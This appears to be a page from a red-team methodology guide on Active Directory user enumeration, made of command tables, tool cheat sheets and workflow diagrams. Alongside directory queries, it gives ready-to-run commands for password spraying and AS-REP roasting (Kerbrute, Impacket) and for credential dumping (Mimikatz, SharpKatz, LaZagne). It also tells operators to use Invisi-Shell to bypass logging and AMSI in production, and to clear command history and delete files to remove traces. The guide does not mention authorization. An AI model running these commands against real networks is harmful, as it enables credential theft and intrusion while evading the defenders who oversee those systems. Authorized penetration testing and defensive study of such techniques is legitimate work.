[Prev: 04_Domain_Enumeration.md](./04_Domain_Enumeration.md) | [Up: Index](./00_Enumeration_Index.md) | [Hub](./00_Methodology_Hub.md) | [Next: 06_Group_Enumeration.md](./06_Group_Enumeration.md)

# 🎯 **USER ENUMERATION MASTERY**

> **🎯 PURPOSE**: This is your **user discovery foundation** for Active Directory enumeration. Every user-based attack path starts here - discovering user accounts, mapping privileges, identifying service accounts, and planning strategic pivots for privilege escalation and lateral movement.

> **⚠️ CRITICAL TOOL REQUIREMENT**: **Invisi-Shell** is mandatory for production environments to ensure stealth operations and avoid detection. See [Tool Arsenal](./01_Tool_Setup_Loading.md#-invisi-shell-complete-setup) for setup instructions.

---

## 📋 **QUICK START USER DISCOVERY**

| **Phase** | **Tool** | **Command** | **Purpose** | **OPSEC Level** |
|-----------|----------|-------------|-------------|------------------|
| **1. Baseline** | `Get-ADUser` | `Get-ADUser -Filter * -Properties memberOf \| Select -First 10` | User population overview | 🟢 Stealth |
| **2. Privilege Map** | `Get-DomainUser` | `Get-DomainUser -Properties admincount,memberof \| Where {$_.admincount -eq 1}` | Admin account discovery | 🟡 Balanced |
| **3. Service Hunt** | `Get-DomainUser` | `Get-DomainUser -SPN \| Select samaccountname,serviceprincipalname` | Service account targets | 🟡 Balanced |
| **4. Session Hunt** | `Find-DomainUserLocation` | `Find-DomainUserLocation -UserGroupIdentity "Domain Admins"` | Active admin sessions | 🔴 Noisy |
| **5. Cross-Domain** | `Get-DomainUser` | `Get-DomainUser -Domain us.cybercorp.local` | Trust relationship mapping | 🟡 Balanced |

---

## 🎭 **AT-A-GLANCE: USER ENUMERATION ESSENTIALS**

### **🔍 What This Technique Reveals**
- **User Population**: Total user count, account types, organizational structure
- **Privilege Landscape**: Admin accounts, group memberships, escalation paths
- **Service Accounts**: SPN users, Kerberoasting targets, high-value services
- **Session Intelligence**: Active logons, local admin access, lateral movement opportunities
- **Cross-Domain Access**: Trust relationships, forest-wide user mapping

### **🎯 Primary Use Cases**
- **Initial Reconnaissance**: Understanding domain user landscape
- **Privilege Escalation**: Identifying high-value accounts and access paths
- **Service Account Discovery**: Finding Kerberoasting and Silver Ticket targets
- **Session Hunting**: Locating active admin sessions for targeting
- **Cross-Domain Enumeration**: Mapping trust relationships and user access

### **⚡ Execution Speed**
- **Stealth Mode**: 2-5 seconds between queries, MS-signed tools only
- **Balanced Mode**: 1-2 seconds between queries, PowerView integration
- **Aggressive Mode**: 200-500ms between queries, full enumeration sweep

---

## 🧭 **PIVOT MATRIX: STRATEGIC NEXT STEPS**

| **Finding** | **Immediate Pivot** | **Strategic Goal** | **Tool/Technique** |
|--------------|---------------------|-------------------|-------------------|
| **Admin Users** | [06_Group_Enumeration.md](./06_Group_Enumeration.md) | Privilege hierarchy mapping | `Get-DomainGroupMember` |
| **SPN Users** | [24_SPN_Enumeration_Techniques.md](./24_SPN_Enumeration_Techniques.md) | Kerberoasting preparation | `Get-DomainUser -SPN` |
| **Preauth Disabled** | [23_Kerberos_Basic_Enumeration.md](./23_Kerberos_Basic_Enumeration.md) | AS-REP roasting targets | `Get-DomainUser -PreauthNotRequired` |
| **Recent Activity** | [16_Session_Analysis_Techniques.md](./16_Session_Analysis_Techniques.md) | Session hunting and targeting | `Find-DomainUserLocation` |
| **Group Memberships** | [09_ACL_Enumeration.md](./09_ACL_Enumeration.md) | Access control analysis | `Get-DomainObjectAcl` |
| **Cross-Domain Users** | [30_Forest_Enumeration.md](./30_Forest_Enumeration.md) | Trust relationship abuse | `Get-DomainTrust` |

---

## 🛠️ **COMPREHENSIVE ENUMERATION TOOLS**

### **🔧 Microsoft-Signed Tools**
- **Microsoft AD Module**: User enumeration via AD objects and services
- **Get-ADUser**: User object enumeration and analysis
- **Get-ADGroup**: Group object enumeration and analysis
- **Get-ADPrincipalGroupMembership**: User group membership analysis
- **Get-ADObject**: General AD object enumeration for user correlation
- **Get-ADDomain**: Domain information for user enumeration scope

### **⚔️ Offensive Tools (PowerView, etc.)**
- **PowerView Suite**: Comprehensive user enumeration and discovery
- **Get-DomainUser**: PowerView user enumeration and analysis
- **Get-DomainGroup**: PowerView group enumeration and analysis
- **Get-DomainGroupMember**: PowerView group membership analysis
- **Find-DomainUserLocation**: PowerView user location hunting
- **Invoke-UserHunter**: PowerView user hunting capabilities

### **🔴 Red Team Enumeration Tools**

#### **🔍 Kerbrute - The Kerberos User Enumeration Tool**
**Purpose**: Fast Kerberos user enumeration and AS-REP roasting
**Setup**: Download from https://github.com/ropnop/kerbrute/releases
**Primary Commands**:
```bash
# Basic user enumeration
kerbrute userenum --dc DC01.corp.local userlist.txt            # Basic user enumeration
kerbrute userenum --dc DC01.corp.local userlist.txt -o results.txt  # Output to file
kerbrute userenum --dc DC01.corp.local userlist.txt --output-format json  # JSON output

# AS-REP roasting
kerbrute asreproast --dc DC01.corp.local userlist.txt         # AS-REP roasting
kerbrute asreproast --dc DC01.corp.local userlist.txt -o asrep_results.txt  # Output to file
kerbrute asreproast --dc DC01.corp.local userlist.txt --format hashcat  # Hashcat format

# Password spraying
kerbrute passwordspray --dc DC01.corp.local userlist.txt Password123  # Password spraying
kerbrute passwordspray --dc DC01.corp.local userlist.txt Password123 -o spray_results.txt  # Output to file

# Advanced options
kerbrute userenum --dc DC01.corp.local userlist.txt --threads 10  # Thread count
kerbrute userenum --dc DC01.corp.local userlist.txt --delay 100   # Delay between requests
kerbrute userenum --dc DC01.corp.local userlist.txt --verbose     # Verbose output
```

#### **🔍 ASREPRoast - The AS-REP Roasting Tool**
**Purpose**: AS-REP roasting for user enumeration and credential extraction
**Setup**: Part of Impacket toolkit, `pip install impacket`
**Primary Commands**:
```bash
# Basic AS-REP roasting
python -m impacket.GetNPUsers corp.local/ -no-pass -usersfile userlist.txt  # Basic AS-REP roasting
python -m impacket.GetNPUsers corp.local/ -no-pass -usersfile userlist.txt -o asrep_results.txt  # Output to file

# Specific user AS-REP roasting
python -m impacket.GetNPUsers corp.local/ -no-pass -request -format hashcat  # Hashcat format
python -m impacket.GetNPUsers corp.local/ -no-pass -request -format john    # John format

# Advanced options
python -m impacket.GetNPUsers corp.local/ -no-pass -usersfile userlist.txt -dc-ip 192.168.1.10  # Custom DC
python -m impacket.GetNPUsers corp.local/ -no-pass -usersfile userlist.txt -debug               # Debug output
```

#### **🔍 Mimikatz - The Credential Extraction Tool**
**Purpose**: Credential extraction and user enumeration
**Setup**: Download `mimikatz.exe` from GitHub
**Primary Commands**:
```cmd
# Basic Mimikatz usage
mimikatz.exe                                                  # Start Mimikatz
privilege::debug                                              # Enable debug privileges
sekurlsa::logonpasswords                                     # Extract logon passwords
sekurlsa::tickets                                            # Extract Kerberos tickets

# User enumeration
lsadump::sam                                                  # Dump SAM database
lsadump::secrets                                             # Dump LSA secrets
lsadump::cache                                               # Dump cached credentials

# Advanced options
sekurlsa::logonpasswords /full                               # Full password extraction
sekurlsa::tickets /export                                    # Export tickets
lsadump::sam /system:SYSTEM /sam:SAM                         # Custom SAM dump
```

#### **🔍 SharpKatz - The C# Mimikatz Alternative**
**Purpose**: C# version of Mimikatz for stealth operations
**Setup**: Download from https://github.com/b4rtik/SharpKatz
**Primary Commands**:
```cmd
# Basic credential extraction
SharpKatz.exe logonpasswords                                  # Extract logon passwords
SharpKatz.exe tickets                                         # Extract Kerberos tickets
SharpKatz.exe sam                                             # Dump SAM database

# User enumeration
SharpKatz.exe secrets                                         # Dump LSA secrets
SharpKatz.exe cache                                           # Dump cached credentials
SharpKatz.exe wdigest                                         # Dump WDigest credentials

# Advanced options
SharpKatz.exe logonpasswords /full                            # Full password extraction
SharpKatz.exe tickets /export                                 # Export tickets
SharpKatz.exe sam /system:SYSTEM /sam:SAM                     # Custom SAM dump
```

#### **🔍 LaZagne - The Credential Recovery Tool**
**Purpose**: Credential recovery from various sources
**Setup**: Download from https://github.com/AlessandroZ/LaZagne
**Primary Commands**:
```bash
# Basic credential recovery
lazagne.exe all                                               # All modules
lazagne.exe all -oJ                                           # JSON output
lazagne.exe all -oX                                           # XML output

# Specific module recovery
lazagne.exe browsers                                          # Browser credentials
lazagne.exe browsers -oJ                                      # Browser credentials JSON output
lazagne.exe browsers -oX                                      # Browser credentials XML output

# Windows credentials
lazagne.exe windows                                           # Windows credentials
lazagne.exe windows -oJ                                       # Windows credentials JSON output
lazagne.exe windows -oX                                       # Windows credentials XML output

# Advanced options
lazagne.exe all -oJ -v                                        # Verbose JSON output
lazagne.exe all -oJ -f                                        # Force mode
lazagne.exe all -oJ -t 5                                      # Thread count
```

### **🛠️ Alternative Enumeration Tools**

#### **🔍 Native Windows User Tools**
**Purpose**: Built-in Windows user enumeration capabilities
**Setup**: Built into Windows
**Primary Commands**:
```cmd
# net commands
net user /domain                                              # List domain users
net user /domain username                                     # Get specific user info
net group /domain                                            # List domain groups
net group /domain "Domain Admins"                            # Get group members

# wmic commands
wmic useraccount get name,disabled,lockout                    # User account info
wmic useraccount where "disabled='false'" get name            # Enabled users only
wmic useraccount where "lockout='true'" get name              # Locked out users

# PowerShell commands
Get-WmiObject -Class Win32_UserAccount                       # WMI user enumeration
Get-WmiObject -Class Win32_UserAccount | Where-Object {$_.Disabled -eq $false}  # Enabled users
Get-WmiObject -Class Win32_UserAccount | Where-Object {$_.Lockout -eq $true}    # Locked users
```

#### **🔍 Online User Enumeration Tools**
**Purpose**: Web-based user enumeration and reconnaissance
**Setup**: Web browser access
**Primary Tools**:
- **LinkedIn**: Professional user enumeration
- **GitHub**: Developer account enumeration
- **Twitter**: Social media user enumeration
- **OSINT frameworks**: Comprehensive open-source intelligence

**Usage Examples**:
```bash
# LinkedIn
# Visit https://www.linkedin.com/company/company-name/
# Search for employees and users

# GitHub
# Visit https://github.com/company-name
# Search for users and repositories

# Twitter
# Search for company-related accounts and users
# Use advanced search operators

# OSINT frameworks
# Use specialized OSINT tools for user enumeration
# Access shared intelligence databases
```

### **🔍 Specialized Tools**

#### **🌐 User Discovery Tools**
- **Kerbrute**: Fast Kerberos user enumeration
- **ASREPRoast**: AS-REP roasting for user discovery
- **Mimikatz**: Credential extraction and user enumeration
- **Custom Scripts**: Advanced user enumeration automation

#### **🔗 User Privilege Analysis Tools**
- **Privilege Mapping**: User privilege level analysis
- **Group Membership Analysis**: User group relationship mapping
- **PowerView**: User privilege analysis via AD integration
- **Custom Scripts**: Advanced privilege analysis automation

#### **📋 User Data Export Tools**
- **PowerView**: CSV export capabilities
- **Native Tools**: Text and structured output
- **Custom Scripts**: Advanced export format automation
- **Data conversion tools**: User data format conversion

#### **🎯 User Attack Vector Tools**
- **User enumeration tools**: User-based attacks
- **Custom Scripts**: Advanced user exploitation
- **Attack planning tools**: User-based attack path planning
- **Exploitation tools**: User-based privilege escalation tools

---

## 🎭 **PERSONAS: REAL-WORLD EXECUTION PROFILES**

### **👤 Persona 1: "Stealth Consultant" (Limited User)**
- **Access Level**: Standard domain user
- **OPSEC Priority**: Maximum stealth, minimal detection
- **Tool Preference**: Microsoft AD Module, native Windows commands
- **Execution Style**: Slow, methodical, scoped queries
- **Target Focus**: Basic user discovery, organizational structure

### **👤 Persona 2: "Power User" (Elevated Access)**
- **Access Level**: Local admin on workstation
- **OPSEC Priority**: Balanced stealth, comprehensive enumeration
- **Tool Preference**: PowerView, Microsoft AD Module, custom scripts
- **Execution Style**: Moderate speed, targeted enumeration
- **Target Focus**: Privilege mapping, service account discovery

### **👤 Persona 3: "Domain Admin" (Full Access)**
- **Access Level**: Domain administrative privileges
- **OPSEC Priority**: Minimal stealth, maximum information gathering
- **Tool Preference**: Full PowerView suite, BloodHound, custom tools
- **Execution Style**: Fast, comprehensive, full enumeration
- **Target Focus**: Complete user landscape, attack path mapping

---

## 🎨 **VISUAL MASTERY: USER ENUMERATION ARCHITECTURE**

### **🏗️ User Enumeration Data Flow Architecture**

```mermaid
graph TB
    subgraph "🎯 ENUMERATION SOURCES"
        A[Domain Controllers] --> A1[Primary DC]
        A --> A2[Global Catalog]
        A --> A3[RODC]
        B[Trust Relationships] --> B1[Child Domains]
        B --> B2[External Trusts]
        B --> B3[Forest Trusts]
    end
    
    subgraph "🔍 ENUMERATION METHODS"
        C[Microsoft AD Module] --> C1[Get-ADUser]
        C --> C2[Get-ADGroup]
        C --> C3[Get-ADPrincipalGroupMembership]
        D[PowerView Suite] --> D1[Get-DomainUser]
        D --> D2[Get-DomainGroup]
        D --> D3[Get-DomainGroupMember]
        E[Native Windows] --> E1[net user /domain]
        E --> E2[net group /domain]
        E --> E3[wmic useraccount]
    end
    
    subgraph "📊 DATA PROCESSING"
        F[User Objects] --> F1[Account Properties]
        F --> F2[Security Attributes]
        F --> F3[Operational Data]
        G[Group Objects] --> G1[Membership Lists]
        G --> G2[Nested Groups]
        G --> G3[Access Rights]
        H[Session Data] --> H1[Active Logons]
        H --> H2[Local Admin Access]
        H --> H3[Remote Sessions]
    end
    
    subgraph "🎯 ANALYSIS OUTPUT"
        I[Privilege Map] --> I1[Admin Accounts]
        I --> I2[Service Accounts]
        I --> I3[Regular Users]
        J[Access Matrix] --> J1[Group Memberships]
        J --> J2[Cross-Domain Access]
        J --> J3[Trust Relationships]
        K[Attack Paths] --> K1[Escalation Routes]
        K --> K2[Lateral Movement]
        K --> K3[Persistence Opportunities]
    end
    
    A --> C
    B --> D
    A --> E
    
    C --> F
    D --> G
    E --> H
    
    F --> I
    G --> J
    H --> K
    
    style A fill:#e3f2fd
    style B fill:#f3e5f5
    style C fill:#e8f5e8
    style D fill:#fff3e0
    style E fill:#fce4ec
    style I fill:#ffebee
    style J fill:#e0f2f1
    style K fill:#f1f8e9
```



**Architecture Explanation:**

This comprehensive diagram illustrates the **complete user enumeration ecosystem**:

1. **Enumeration Sources**: Multiple entry points for user discovery
   - **Domain Controllers**: Primary, Global Catalog, and Read-Only DCs
   - **Trust Relationships**: Cross-domain and cross-forest access

2. **Enumeration Methods**: Three-tier approach for comprehensive coverage
   - **Microsoft AD Module**: Stealthy, CLM-friendly enumeration
   - **PowerView Suite**: Offensive, feature-rich enumeration
   - **Native Windows**: Built-in, detection-resistant enumeration

3. **Data Processing**: Structured approach to information gathering
   - **User Objects**: Account properties, security attributes, operational data
   - **Group Objects**: Membership lists, nested groups, access rights
   - **Session Data**: Active logons, local admin access, remote sessions

4. **Analysis Output**: Strategic intelligence for attack planning
   - **Privilege Map**: Understanding user hierarchy and access levels
   - **Access Matrix**: Group memberships and cross-domain relationships
   - **Attack Paths**: Escalation routes and lateral movement opportunities

### **🎯 User Discovery Workflow Visualization**

```mermaid
flowchart TD
    A["🚀 START: Invisi-Shell Setup"] --> B["🛠️ Tool Loading & Preparation"]
    B --> C["🔍 Phase 1: Basic User Discovery"]
    C --> D["🎯 Phase 2: Privilege Analysis"]
    D --> E["🔗 Phase 3: Group Membership Mapping"]
    E --> F["🌐 Phase 4: Cross-Domain Enumeration"]
    F --> G["⚙️ Phase 5: Service Account Discovery"]
    G --> H["👥 Phase 6: Session Hunting & Analysis"]
    H --> I["📊 Phase 7: Advanced User Analysis"]
    I --> J["🧹 Phase 8: OPSEC Cleanup & Export"]
    
    B --> B1["Import-Module ActiveDirectory"]
    B --> B2["dot-source PowerView.ps1"]
    B --> B3["Verify Invisi-Shell Status"]
    
    C --> C1["Get-DomainUser -Domain cybercorp.local"]
    C --> C2["Get-ADUser -Filter * -Properties basic"]
    C --> C3["User Population Analysis"]
    
    D --> D1["Get-DomainUser -Properties admincount,memberof"]
    D --> D2["Admin Account Identification"]
    D --> D3["Privilege Level Assessment"]
    
    E --> E1["Get-DomainGroupMember -Identity Domain-Admins"]
    E --> E2["Nested Group Analysis"]
    E --> E3["Access Right Mapping"]
    
    F --> F1["Get-DomainUser -Domain us.cybercorp.local"]
    F --> F2["Trust Relationship Analysis"]
    F --> F3["Cross-Domain User Mapping"]
    
    G --> G1["Get-DomainUser -SPN -Properties serviceprincipalname"]
    G --> G2["Service Account Classification"]
    G --> G3["Kerberoasting Target Identification"]
    
    H --> H1["Find-DomainUserLocation -UserGroupIdentity Domain-Admins"]
    H --> H2["Local Admin Access Discovery"]
    H --> H3["Session Enumeration & Analysis"]
    
    I --> I1["Advanced UAC Flag Analysis"]
    I --> I2["Password Policy Assessment"]
    I --> I3["Account Misconfiguration Discovery"]
    
    J --> J1["Export Results to CSV/JSON"]
    J --> J2["Remove Variables & Cleanup"]
    J --> J3["Session Termination"]
    
    style A fill:#e1f5fe
    style J fill:#c8e6c9
    style B1 fill:#fff3e0
    style B2 fill:#fff3e0
    style B3 fill:#fff3e0
    style C1 fill:#e8f5e8
    style D1 fill:#e3f2fd
    style E1 fill:#f3e5f5
    style F1 fill:#fff3e0
    style G1 fill:#fce4ec
    style H1 fill:#e0f2f1
    style I1 fill:#f1f8e9
```



**Workflow Explanation:**

This comprehensive workflow demonstrates the **systematic approach to user enumeration**:

1. **Stealth Setup**: Begin with Invisi-Shell to bypass logging and detection mechanisms
2. **Tool Loading**: Load Microsoft-signed modules first, then dot-source PowerView for offensive helpers
3. **Basic Discovery**: Establish baseline user population and domain structure
4. **Privilege Analysis**: Identify high-value accounts and access levels
5. **Group Mapping**: Understand privilege hierarchies and escalation paths
6. **Cross-Domain**: Extend enumeration across trust relationships
7. **Service Discovery**: Identify high-value service accounts for credential attacks
8. **Session Hunting**: Find active sessions and access opportunities
9. **Advanced Analysis**: Discover misconfigurations and attack vectors
10. **Cleanup**: Export results and remove traces

---

## 🏭 **LAB vs PRODUCTION: EXECUTION PROFILES**

### **🧪 LAB ENVIRONMENT (Aggressive Enumeration)**
```powershell
# Full enumeration sweep - LAB ONLY
Get-DomainUser -Properties * | Export-Csv -Path "C:\AD\Exports\users_full.csv" -NoTypeInformation

# Comprehensive group analysis
Get-DomainGroup -Properties * | ForEach-Object { 
    Get-DomainGroupMember -Identity $_.Name -Recurse 
} | Export-Csv -Path "C:\AD\Exports\group_memberships.csv" -NoTypeInformation

# Service account discovery
Get-DomainUser -SPN | Export-Csv -Path "C:\AD\Exports\service_accounts.csv" -NoTypeInformation
```

**Lab Characteristics:**
- **Speed**: Maximum speed, no delays between queries
- **Scope**: Full enumeration, all properties, comprehensive coverage
- **Tools**: Full PowerView suite, custom scripts, aggressive techniques
- **OPSEC**: Minimal stealth considerations, maximum information gathering

### **🏢 PRODUCTION ENVIRONMENT (Stealth Operations)**
```powershell
# Stealthy baseline enumeration
Get-ADUser -Filter * -Properties memberOf,lastLogonDate | Select-Object -First 20 | 
    Export-Csv -Path "C:\AD\Exports\users_baseline.csv" -NoTypeInformation

# Targeted privilege analysis
Get-DomainUser -Properties admincount,memberof | Where-Object { $_.admincount -eq 1 } |
    Export-Csv -Path "C:\AD\Exports\admin_users.csv" -NoTypeInformation

# Scoped service account discovery
Get-DomainUser -SPN | Select-Object samaccountname,serviceprincipalname -First 10 |
    Export-Csv -Path "C:\AD\Exports\service_accounts_limited.csv" -NoTypeInformation
```

**Production Characteristics:**
- **Speed**: Controlled timing, 2-5 second delays between queries
- **Scope**: Targeted enumeration, essential properties only
- **Tools**: Microsoft AD Module preferred, PowerView for specific needs
- **OPSEC**: Maximum stealth, minimal detection footprint

---

## 🛡️ **DETECTION, OPSEC & CLEANUP**

### **🚨 DETECTION INDICATORS**

**High-Risk Events:**
- **Event ID 4662**: Object access (user enumeration queries)
- **Event ID 5136**: Directory service changes (user modifications)
- **Event ID 5141**: Directory service replication (cross-domain queries)
- **Event ID 4778**: Session reconnection (session enumeration)
- **Event ID 4779**: Session reconnection on different station (lateral movement)

**Suspicious Patterns:**
- **Bulk User Enumeration**: Large numbers of user queries in short time
- **Cross-Domain Queries**: Queries to multiple domains simultaneously
- **Property Enumeration**: Requests for all user properties
- **Service Account Discovery**: Targeted SPN enumeration
- **Session Hunting**: Active session enumeration across multiple machines

### **🕵️ OPSEC BEST PRACTICES**

> **🔒 STEALTH REQUIREMENT**: **Invisi-Shell** must be loaded before any user enumeration in production environments to bypass logging and AMSI detection. This is non-negotiable for operational security.

**Stealth Techniques:**
```powershell
# Use Microsoft-signed modules when possible
Import-Module ActiveDirectory

# Minimize property retrieval
Get-ADUser -Filter * -Properties samaccountname, name | Select-Object -First 10

# Use SOAP/ADWS instead of direct LDAP when possible
# (ActiveDirectory module uses ADWS by default)

# Avoid bulk enumeration in single queries
Get-ADUser -Filter * -Properties * | Select-Object -First 5

# Add delays between queries
Start-Sleep -Seconds (Get-Random -Minimum 2 -Maximum 6)
```

**Detection Avoidance:**
```powershell
# Use built-in Windows commands when possible
net user /domain
net group /domain

# Minimize PowerShell logging
# (Invisi-Shell already handles this - see 01_Tool_Setup_Loading.md for setup)

# Use native AD queries instead of custom filters
Get-ADUser -Filter * | Select-Object Name, SamAccountName
```

### **🧹 CLEANUP PROCEDURES**

**Data Export Cleanup:**
```powershell
# Remove exported files
Remove-Item "C:\AD\Exports\*.csv" -Force
Remove-Item "C:\AD\Exports\*.json" -Force

# Clear PowerShell variables
Remove-Variable -Name * -Force -ErrorAction SilentlyContinue

# Remove loaded modules
Remove-Module ActiveDirectory -Force -ErrorAction SilentlyContinue
Remove-Module PowerView -Force -ErrorAction SilentlyContinue
```

**Session Cleanup:**
```powershell
# Clear command history
Clear-History

# Exit PowerShell session
exit
```

---

## 🔗 **NAVIGATION & REFERENCES**

### **📚 Navigation Links**
- **[Enumeration Index](./00_Enumeration_Index.md)**: Master navigation hub
- **[Methodology Hub](./00_Methodology_Hub.md)**: Strategic execution framework
- **[Tool Setup](./01_Tool_Setup_Loading.md)**: Tool arsenal and loading procedures
- **[Network Enumeration](./02_Network_Enumeration.md)**: Network discovery foundation
- **[DNS Enumeration](./03_DNS_Enumeration.md)**: DNS enumeration techniques
- **[Domain Enumeration](./04_Domain_Enumeration.md)**: Domain structure and trust analysis

### **📖 Technical References**
- **Microsoft Docs**: Get-ADUser, Get-ADGroup, Active Directory PowerShell
- **PowerView Documentation**: Get-DomainUser, Get-DomainGroup, offensive enumeration
- **ATT&CK Framework**: Account Discovery (T1033), Permission Groups Discovery (T1069)
- **BloodHound**: Attack path mapping and visualization
- **Kerberoasting**: Service account credential attacks

---

[Prev: 04_Domain_Enumeration.md](./04_Domain_Enumeration.md) | [Up: Index](./00_Enumeration_Index.md) | [Hub](./00_Methodology_Hub.md) | [Next: 06_Group_Enumeration.md](./06_Group_Enumeration.md)
